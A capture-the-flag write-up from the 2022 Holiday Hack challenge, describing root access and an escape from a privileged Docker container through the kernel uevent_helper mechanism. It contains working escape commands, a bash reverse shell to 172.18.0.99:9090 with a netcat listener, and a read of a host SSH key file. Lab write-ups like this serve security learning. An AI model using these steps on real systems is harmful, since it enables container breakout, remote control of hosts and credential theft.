# Prison Escape

Time to escape the Docker Prison. This was a neato exercise, since prior to this the extent of my Docker escapes usually revolved around poor developers that didn't think Docker containers were as ephemeral as they are supposed to be considered and left behind pretty sensitive artifacts that an attacker could use to pivot.

```
######################################################
Sun Dec 11 17:26:03 UTC 2022
On attempt [5] of trying to connect.
If no connection is made after [60] attempts
contact the holidayhack sys admins via discord.
######################################################
 
Greetings Noble Player, 

You find yourself in a jail with a recently captured Dwarven Elf.

He desperately asks your help in escaping for he is on a quest to aid a friend in a search for treasure
inside a crypto-mine. 

If you can help him break free of his containment, he claims you would receive "MUCH GLORY!"

Please, do your best to un-contain yourself and find the keys to both of your freedom.
```

Greeted with a shell. A shell in which I had sudo access with no password, which honestly is one of the first things I check whenever I'm presented with any shell:

!!! abstract ""
    ```
    grinchum-land:~$ sudo -l
    User samways may run the following commands on grinchum-land:
        (ALL) NOPASSWD: ALL
    grinchum-land:~$ sudo su
    grinchum-land:/home/samways# id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(
    dialout),26(tape),27(video)
    ```

Ok, so now that I'm root...let's try to break out of this container. Assuming of course it actually _is_ a container. One easy way to check is for the existance of `/.dockerenv` file, but another more definitive way is to check for `/docker` appearing anywhere in `#!sh cat /proc/1/cgroup`:

!!! abstract ""
    ```
    grinchum-land:/home/samways# cat /proc/1/cgroup
    11:blkio:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    10:pids:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    9:perf_event:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    8:hugetlb:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    7:cpuset:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    6:devices:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    5:cpu,cpuacct:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    4:memory:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    3:freezer:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    2:net_cls,net_prio:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    1:name=systemd:/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    0::/docker/c686b7175d5ad3fa9d3cde4ac0bc8607067bedd1b59007a77d409f15f691d380
    ```

I think that about confirms it. Next, it'd be nice to see what _kind_ of access we have. If we are inside a privileged container, we should see access to a ton of additional devices.

!!! abstract ""
    ```
    grinchum-land:/home/samways# ls /dev
    autofs           loop0   nvram     tty1   tty20  tty31  tty42  tty53  tty7     vcs5   vcsu3
    btrfs-control    loop1   ptmx      tty10  tty21  tty32  tty43  tty54  tty8     vcs6   vcsu4
    core             loop2   ptp0      tty11  tty22  tty33  tty44  tty55  tty9     vcsa   vcsu5
    cpu              loop3   pts       tty12  tty23  tty34  tty45  tty56  ttyS0    vcsa1  vcsu6
    cpu_dma_latency  loop4   random    tty13  tty24  tty35  tty46  tty57  uhid     vcsa2  vda
    cuse             loop5   shm       tty14  tty25  tty36  tty47  tty58  uinput   vcsa3  vsock
    fd               loop6   snapshot  tty15  tty26  tty37  tty48  tty59  urandom  vcsa4  zero
    full             loop7   stderr    tty16  tty27  tty38  tty49  tty6   vcs      vcsa5
    fuse             mem     stdin     tty17  tty28  tty39  tty5   tty60  vcs1     vcsa6
    input            mqueue  stdout    tty18  tty29  tty4   tty50  tty61  vcs2     vcsu
    kmsg             net     tty       tty19  tty3   tty40  tty51  tty62  vcs3     vcsu1
    loop-control     null    tty0      tty2   tty30  tty41  tty52  tty63  vcs4     vcsu2
    ```

That sure looks like a ton to me. Finally, do we have access to manipulate and/or view the disk devices?

!!! abstract ""
    ```
    grinchum-land:/home/samways# fdisk -l
    Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
    2048 cylinders, 64 heads, 32 sectors/track
    Units: sectors of 1 * 512 = 512 bytes

    Disk /dev/vda doesn't contain a valid partition table
    ```

That's pretty nice to see! If we didn't, it would just throw an error stating no disks present or something similar.

Since we have access to the disk devices, it should also give us a peek at the `overlay` structure, which is the disk mapping Docker uses to map a specific area of the host's file system to the Docker environment we are currently in. We can find that from `/etc/mtab`:

!!! abstract ""
    ``` hl_lines="7 8"
    grinchum-land:/home/samways# cat /etc/mtab
    overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/R72VN2IY7X6PADNRRRSD2CLDEE:/var/lib/
    docker/overlay2/l/NGXZFSYYAMGAG3MBDS3RKZDAFS:/var/lib/docker/overlay2/l/KZJ6C34VUHID76QV2CEK7YTS2V:/var/
    lib/docker/overlay2/l/DMXRNFYOCEIS2LYUNKUAFUSLJ5:/var/lib/docker/overlay2/l/
    XZMVAGETZ3I4DPJGUQXFLFYQLH:/var/lib/docker/overlay2/l/7M7R3HGJRPY6XZT5AQ2EMVSX54:/var/lib/docker/overlay2
    /l/Q3H4YFMDHRP6UFIDK5JZZ6KPHY:/var/lib/docker/overlay2/l/4FI2PHXXWQ3LRN3O7TQTUP6CUB:/var/lib/docker/
    overlay2/l/ZHKZEXRWKO42ALFAZO7ON4QBFS:/var/lib/docker/overlay2/l/QRJPUVBV4PT4OBPKQ7RTGE32EZ,upperdir=/var
    /lib/docker/overlay2/c6480c70869c5a0e4fbfee8a923461aba884051da8688a808bc16c53e686b633/diff,workdir=/var/
    lib/docker/overlay2/c6480c70869c5a0e4fbfee8a923461aba884051da8688a808bc16c53e686b633/work 0 0
    proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
    tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
    devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
    sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
    tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
    cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
    cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
    cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
    cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0
    cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
    cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
    cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
    cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
    cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
    cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
    cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
    mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
    /dev/root /config ext4 rw,relatime 0 0
    /dev/root /etc/resolv.conf ext4 rw,relatime 0 0
    /dev/root /etc/hostname ext4 rw,relatime 0 0
    /dev/root /etc/hosts ext4 rw,relatime 0 0
    shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
    ```

Yikes, that's a lot to take in. And really we only need _one very specific_ section of a long line from the above, and that's everything after `upperdir=` up to -- but not including -- the next comma. I can grab that with some snazzy linux-fu. I will grab it and set it to the variable `HOSTPATH`

!!! abstract ""
    ```sh
    HOSTPATH=$(grep overlay /etc/mtab | awk -F, '{print $4}' | cut -f2 -d=)
    ```

Now that all the ducks are lined up in a nice neat little row, it's time to see if I can get code execution on the host OS. For this, I can issue a command to the host's `uevent_helper` to fool it into executing something when a new device is mounted on the container's file system. This mechanism is only allowed because I have the `CAP_SYS_ADMIN` capability, which is proven from the above checks. I can trigger a change event by sending the word `change` to `/sys/class/mem/null/uevent`. This should execute the script mentioned in `uevent_helper` because we are fooling the host into thinking a device was unplugged or plugged in and are executing the helper script as a result. Pretty sneaky.

To make it a little easier, I will create a script in the root directory named `t.sh` which will determine the full path of itself and write the output to that directory. Just to test if I have code execution however, I will simply `#!sh cat` the host's `/etc/hostname` to the file `/o.txt`. If it's different from the docker container's (which is `grinchum-land`), then I did it!

This is the script I came up with:

!!! abstract "t.sh"
    ```sh
    #!/bin/sh
    b=`dirname $0`
    cat /etc/hostname > $b/o.txt
    ```

As mentioned before, it is fairly straightforward. Sets the `b` variable to whatever the full path is that calls the script, then runs a command that outputs to the same directory as `o.txt`. 

Of course, I can't forget to give it execute permissions.

!!! abstract ""
    ```sh
    chmod 755 /t.sh
    ```

I guess I could use `chmod 777`, but while I may be a hacker, I used to be a sysadmin, and I am not rooted in pure evil. Mostly. I guess old habits die hard.

I then added our script to the event helper and triggered a change:

```sh
echo "$HOSTPATH/t.sh" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
```

Now the output showed:

![Output](/img/elfhouse/prisonescape1.png)

Nice, showed the hostname of the host OS. I have code execution! From here I can have the remote host serve back a reverse shell. And given the weird UI that I have to work with, I will need another window to catch the reverse shell. Do I have something like `tmux` on the machine?

...yes I do.

Well then...let's get a shell!

I changed the `t.sh` script instead to run this:

!!! abstract "t.sh"
    ```sh
    #!/bin/bash
    /bin/bash -i >& /dev/tcp/172.18.0.99/9090 0>&1
    ```

My fairly standard reverse shell. Good ol' Bash!

Now...start up tmux by typing `tmux`, then split the terminal with ++ctrl+b++ then `%`.

In one terminal, start up the reverse shell listener:

!!! abstract ""
    ```sh
    nc -lvnp 9090
    ```

Some ask me, "why always port 9090?" I always ask that of all my prey. I just like the sound of it.

Actually that's literally the only reason I use 9090. It's just easier to say and it's muscle memory by now.

Then execute the previous command as before:

!!! abstract ""
    ```
    echo "$(grep overlay /etc/mtab | awk -F, '{print $4}' | cut -f2 -d=)"/t.sh" > /sys/kernel/uevent_helper
    echo change > /sys/class/mem/null/uevent
    ```

And...

![Reverse Shell](/img/elfhouse/reverseshell.png)

Poking around the OS doesn't give me much, except to say that I am in _yet another Docker container_, and I am yet again _still in a privileged container_. Unfortunately for me this time, this is a much more bare-bones container without nmap or netcat, so instead of spending a lot of time jerry-rigging a new reverse shell or poking around the network this container is a part of (which gives me more access to the 172.17.0.0/24 subnet), I will stop here assuming this is already in scope. Though I did notice that python exists on this host...ooo, so tempting but no. I've gotten in trouble for much less.

Now, since the challenge states :

!!! question "Challenge"
    Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring.
    What hex string appears in the host file `/home/jailer/.ssh/jail.key.priv`?

After changing the `cat /etc/hostname` to `cat /home/jailer/.ssh/jail.key.priv` and viewing the resulting `o.txt` file, I am greeted with this:

![Flag](/img/elfhouse/prisonescape2.png)

And just so I have the ascii:

```

                Congratulations! 

          You've found the secret for the 
          HHC22 container escape challenge!

                     .--._..--.
              ___   ( _'-_  -_.'
          _.-'   `-._|  - :- |
      _.-'           `--...__|
   .-'                       '--..___
  / `._                              \
   `. `._               one           |
     `. `._                           /
       '. `._    :__________....-----'
         `..`---'    |-_  _- |___...----..._
                     |_....--'             `.`.
               _...--'                       `.`.
          _..-'                             _.'.'
       .-'             step                _.'.'
       |                               _.'.'
       |                   __....------'-'
       |     __...------''' _|
       '--'''        |-  - _ |
               _.-''''''''''''''''''-._
            _.'                        |\
          .'                         _.' |
          `._          closer           |:.'
            `._                     _.' |
               `..__                 |  |
                    `---.._.--.    _|  |
                     | _   - | `-.._|_.'
          .--...__   |   -  _|
         .'_      `--.....__ |
        .'_                 `--..__
       .'_                         `.
      .'_    082bb339ec19de4935867   `-.
      `--..____                        _`.
               ```--...____          _..--'
                     | - _ ```---.._.'
                     |   - _ |
                     |_ -  - |
                     |   - _ |
                     | -_  -_|
                     |   - _ |
                     |   - _ |
                     | -_  -_|
```